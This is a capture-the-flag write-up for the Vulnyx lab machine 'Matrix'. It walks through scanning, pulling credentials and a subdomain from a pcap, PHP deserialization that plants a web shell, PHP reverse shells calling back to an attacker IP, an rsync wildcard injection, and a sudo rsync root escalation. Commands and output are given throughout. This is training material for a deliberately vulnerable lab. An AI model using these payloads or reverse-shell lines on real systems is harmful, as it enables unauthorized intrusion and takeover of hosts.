---
author: Lenam
pubDatetime: 2025-02-04T15:22:00Z
title: WriteUp Matrix - Vulnyx
slug: matrix-writeup-vulnyx-en
featured: true
draft: false
ogImage: "assets/matrix/OpenGraph.png"
tags:
  - writeup
  - vulnyx
  - wireshark
  - rsync wildcard
  - sudo
  - PHP serialization
description:
  This writeup documents the exploitation of a vulnerable machine inspired by Matrix, using traffic analysis, PHP injection, and privilege escalation with rsync to gain root access.
lang: en
---

![Rabbit in Matrix](/assets/matrix/OpenGraph.png)

This writeup documents the exploitation of a vulnerable machine inspired by Matrix, using traffic analysis, PHP injection, and privilege escalation with rsync to gain root access.

## Table of Contents

## Enumeration

We scan ports with nmap.

```bash
$ nmap -p- -Pn -n -T4 -oN allPorts 192.168.1.168            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 02:54 CET
Nmap scan report for 192.168.1.168
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D6:75:BB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds

$ nmap -p22,80 -sVCU -Pn 192.168.1.168  -oN onlyports-udp
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 02:55 CET
Nmap scan report for 192.168.1.168
Host is up (0.00027s latency).

PORT   STATE  SERVICE VERSION
22/udp closed ssh
80/udp closed http
MAC Address: 08:00:27:D6:75:BB (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds

```

We see two open ports, 22 for the SSH service and port 80 for the Web service.

We access the web service using the browser.

![alt text](/assets/matrix/image-1.png)

Inside the source code, we find a comment with a clue.

![alt text](/assets/matrix/image-2.png)

`Follow the red rabbit... Is it a dream or a clue? Within the saved traffic, you may find traces of the Matrix. Could it be a .pcap file ready to fuzz?`

So without hesitation, we perform fuzzing on the web service in search of a file with the `.pcap` extension, where part of the Matrix traffic may have been leaked.

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.168 -x .pcap,.php,.txt,.zip,.db
```

![alt text](/assets/matrix/image-3.png)

We find a file named `trinity.pcap`.

## Analysis of the pcap traffic file

We download the file to our attacking machine and open it with Wireshark to analyze the traffic.

```bash
wget http://192.168.1.168/trinity.pcap
```

We find many users, passwords, and subdomains of different services (FTP, RSYNC, HTTP, ...). Fortunately, nothing is encrypted, allowing us to analyze it easily.

We detect an image being transferred via HTTP and attempt to extract it from the traffic using Wireshark.

![alt text](/assets/matrix/image-4.png)

![alt text](/assets/matrix/image-5.png)

Once downloaded, we rename it and analyze the metadata with the `exiftool` tool.

```bash
$ ls
allPorts  object172.image%2fwebp  onlyports-udp  trinity.pcap
$ mv object172.image%2fwebp extracted-image.webp
$ exiftool extracted-image.webp
ExifTool Version Number         : 13.00
File Name                       : extracted-image.webp
Directory                       : .
    ...
Vertical Scale                  : 0
XMP Toolkit                     : Image::ExifTool 12.57
Description                     : Morpheus, we have found a direct connection to the 'Mind', the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.
Image Size                      : 800x800
Megapixels                      : 0.640
```

We find a very interesting comment in the `Description` metadata, where another domain `M47r1X.matrix.nyx` is leaked.

```text
Morpheus, we have found a direct connection to the 'Mind', the artificial intelligence that controls the Matrix. You can find it at the domain M47r1X.matrix.nyx.
```

![alt text](/assets/matrix/image-7.png)

Other ways to obtain this subdomain and other sensitive data from the pcap file include analyzing the traffic within Wireshark itself or using the `strings` and `grep` commands.

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/matrix]
└─$ strings trinity.pcap| grep PASS  
PASSWORD: kT8020e136Z2YLJa2fEZ
PASSWORD: krGVRU2vCedfwjVZXDrp
PASSWORD: BgUvmyV0OEgEDpMjpJUv
PASSWORD: 2LmQA1WT2Xc4avgGA1yY
PASS morpheus
PASS zion
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTFs/Vulnyx/matrix]
└─$ strings trinity.pcap| grep -Eo "[a-zA-Z0-9._-]+\.matrix\.nyx"
M47r1X.matrix.nyx
```

More information can be found in the `.pcap` file...

![alt text](/assets/matrix/image-6.png)

Some subdomains are irrelevant, but the one that works is `M47r1X.matrix.nyx`, which contains a virtual host. We add it to our hosts file.

## Intrusion

We access the virtual host `M47r1X.matrix.nyx` through the browser to enter **The Mind** of the Matrix ;)

![alt text](/assets/matrix/image-8.png)

If we send messages, the chat always responds with strange symbols. However, there is a random chance it might provide a clue:

![alt text](/assets/matrix/image-9.png)

We obtain a file containing a backend leak.

![alt text](/assets/matrix/image-10.png)

In the page source code, we find a comment and JavaScript code that gives us more hints about the intrusion process, as well as a possible message related to the backend leak.

```javascript
            /**
             * Serializes an object to PHP format (similar to serialize() in PHP)
             * @param {string} message - The string message to serialize
             */
            function phpSerialize(message) {
                return 'O:7:"Message":1:{s:7:"message";s:' + message.length + ':"' + message + '";}';
            }
```

We use BurpSuite to facilitate the intrusion. We send the message `test` and observe that it sends a PHP-serialized object, which is likely deserialized on the server using the leaked PHP class.

![alt text](/assets/matrix/image-11.png)

```bash
O:7:"Message":1:{s:7:"message";s:4:"test";}
```

We can write a PHP script to serialize the object, but it can also be done manually. Below is a payload to create `shell.php` on the server:

```php
<?php

class Message {
    public $file = "messages.txt";
    public $message = "";
    public function __unserialize(array $data){
        file_put_contents($data['file'],$data['message']."\n", FILE_APPEND);
    }
}
$msg = new Message();
$msg->file = 'shell.php';
$msg->message = "<?php echo exec(\$_GET[\"cmd\"]); ?>";

echo serialize($msg);

```

We execute the script, and this is what we will send:

```bash
┌──(kali㉿kali)-[~/CTFs/Vulnyx/matrix]
└─$ php serialize.php 
O:7:"Message":2:{s:4:"file";s:9:"shell.php";s:7:"message";s:33:"<?php echo exec($_GET[\"cmd\"]); ?>";}
```

![alt text](/assets/matrix/image-12.png)

Now we have an RCE through the `shell.php` file created by deserializing the PHP message.

![alt text](/assets/matrix/image-13.png)

We create a reverse shell in PHP. The IP `192.168.1.116` belongs to our attacking machine.

```bash
php -r '$sock=fsockopen("192.168.1.116",443);exec("/bin/bash <&3 >&3 2>&3");'
```

We start a listener using Netcat, encode the reverse shell in URL encoding, and send it to the `cmd` parameter of our improvised shell. To obtain a more complete shell, we handle the TTY properly.

```bash
nc -lvnp 443
```

```bash
wget http://m47r1x.matrix.nyx/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.116%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

![alt text](/assets/matrix/image-14.png)

Now we are the `www-data` user.

```bash
www-data@matrix:/var/www/M47r1X.matrix.nyx$ ls -la
total 36
drwxr-xr-x 2 www-data www-data 4096 Jan 29 13:27 .
drwxr-xr-x 4 root     root     4096 Jan 28 21:00 ..
-rw-r--r-- 1 root     root      361 Jan 27 02:47 filtrate-backend-matrix.php.txt
-rw-r--r-- 1 root     root     1765 Jan 27 01:04 hoja.css
-rw-r--r-- 1 root     root     4782 Jan 28 23:55 index.php
-rw-r--r-- 1 root     root      806 Jan 27 00:48 matrix.js
-rw-r--r-- 1 www-data www-data   17 Jan 29 13:26 messages.txt
-rw-r--r-- 1 www-data www-data   34 Jan 29 13:27 shell.php
```

## Privilege Escalation

We properly handle the TTY to obtain a full shell.

We check which users exist on the system.

```bash
www-data@matrix:/var/www/M47r1X.matrix.nyx$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
smith:x:1000:1000::/home/smith:/bin/bash
```

There is another user.

At this point, we are the `www-data` user, and we have two ways to laterally move to the `smith` user: the easy way, using **smith’s leaked password from an RSYNC log in the pcap file**, or the more complex way, using the **rsync Wildcards technique**.

This occurs due to an incorrect machine implementation, but since this possibility exists, I explain it in this writeup.

### www-data to smith (su)

One of the leaked passwords in the pcap file belongs to `smith`, so we can simply use `su` to switch users.

```bash
$ strings trinity.pcap | grep -A 3 -B 3 smith
 ....
--
matrix
morpheus
matrix
RSYNC COMMAND: rsync --daemon /home/smith/file.txt 192.168.2.100:/backup/smith/
PASSWORD: kT8020e136Z2YLJa2fEZ
OK: File transferred successfully
RSYNC COMMAND: rsync --daemon /home/john/file.txt 192.168.2.100:/backup/john/
--

$ su smith
```

We enter the leaked password, and we are now `smith`.

### www-data to smith (rsync Wildcards)

The more complex method: If we use `pspy64` or any other tool, we can monitor processes running under the `smith` user.

![alt text](/assets/matrix/image-15.png)

We observe that there is a scheduled task running every minute.

```bash
/bin/sh -c cd /var/www/M47r1X.matrix.nyx && rsync -e "ssh -o BatchMode=yes"  -t *.txt matrix:/home/smith/messages/ > /dev/null 2>&1
```

Since we have write permissions in `/var/www/M47r1X.matrix.nyx`, we can attempt an `rsync Wildcard` attack. More information can be found at https://www.exploit-db.com/papers/33930.

We create the file `shell.txt` using `nano` and the file `-e sh shell.txt`.

```bash
www-data@matrix:/var/www/M47r1X.matrix.nyx$ cat shell.txt
php -r '$sock=fsockopen("192.168.1.116",12345);exec("/bin/bash <&3 >&3 2>&3");'

www-data@matrix:/var/www/M47r1X.matrix.nyx$ touch ./'-e sh shell.txt' 
www-data@matrix:/var/www/M47r1X.matrix.nyx$ ls -la
total 40
-rw-r--r-- 1 www-data www-data    0 Jan 29 14:26 '-e sh shell.txt'
drwxr-xr-x 2 www-data www-data 4096 Jan 29 14:26  .
drwxr-xr-x 4 root     root     4096 Jan 28 21:00  ..
-rw-r--r-- 1 root     root      361 Jan 27 02:47  filtrate-backend-matrix.php.txt
-rw-r--r-- 1 root     root     1765 Jan 27 01:04  hoja.css
-rw-r--r-- 1 root     root     4782 Jan 28 23:55  index.php
-rw-r--r-- 1 root     root      806 Jan 27 00:48  matrix.js
-rw-r--r-- 1 www-data www-data   17 Jan 29 13:26  messages.txt
-rw-r--r-- 1 www-data www-data   34 Jan 29 13:27  shell.php
-rw-r--r-- 1 www-data www-data   80 Jan 29 14:25  shell.txt
```

On our attacking machine, we start listening with Netcat.

```
nc -lvnp 12345
```

And after one minute, we obtain a shell as the `smith` user.

![alt text](/assets/matrix/image-16.png)

### smith to root (sudo rsync)

We attempt to read the `user.txt` flag, but we lack read permissions. Since we own the file, we grant ourselves read access.

```bash
smith@matrix:~$ chmod +r user.txt 
smith@matrix:~$ ls -la
total 40
drwx--x--x 5 smith smith 4096 Jan 29 14:09 .
drwxr-xr-x 3 root  root  4096 Jan 28 22:41 ..
lrwxrwxrwx 1 smith smith    9 Jan 29 00:07 .bash_history -> /dev/null
-rwx------ 1 smith smith  220 Mar 29  2024 .bash_logout
-rwx------ 1 smith smith 3526 Mar 29  2024 .bashrc
drwx------ 3 smith smith 4096 Jan 28 23:45 .local
drwx------ 2 smith smith 4096 Jan 29 13:54 messages
-rwx------ 1 smith smith  807 Mar 29  2024 .profile
-rwx------ 1 smith smith   66 Jan 28 23:45 .selected_editor
drwx------ 2 smith smith 4096 Jan 29 14:09 .ssh
-rw-r--r-- 1 smith smith   33 Jan 29 01:15 user.txt
smith@matrix:~$ cat user.txt 
13.....................6
```

`sudo` is installed, and `smith`’s password is leaked in the `rsync` traffic from the initial pcap file.

```bash
$ strings trinity.pcap | grep -A 3 -B 3 smith
 ....
--
matrix
morpheus
matrix
RSYNC COMMAND: rsync --daemon /home/smith/file.txt 192.168.2.100:/backup/smith/
PASSWORD: kT8020e136Z2YLJa2fEZ
OK: File transferred successfully
RSYNC COMMAND: rsync --daemon /home/john/file.txt 192.168.2.100:/backup/john/
--
 ....
```

We can also verify this using Wireshark.

```bash
smith@matrix:~$ sudo -l
[sudo] password for smith: 
Matching Defaults entries for smith on matrix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User smith may run the following commands on matrix:
    (ALL) PASSWD: /usr/bin/rsync
```

We can execute `rsync` as the root user. Thanks to `gtfobins`, we find a way to escalate privileges to root.

![alt text](/assets/matrix/image-17.png)

We execute it and obtain a root shell, allowing us to read the final flag.

```bash
smith@matrix:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
5XXXXXXXXXXXXXXXXXa
# 
```

That’s it.

I hope you enjoyed this, learned something new, or at least had fun solving the mystery of entering "The Mind" of the Matrix. 😉
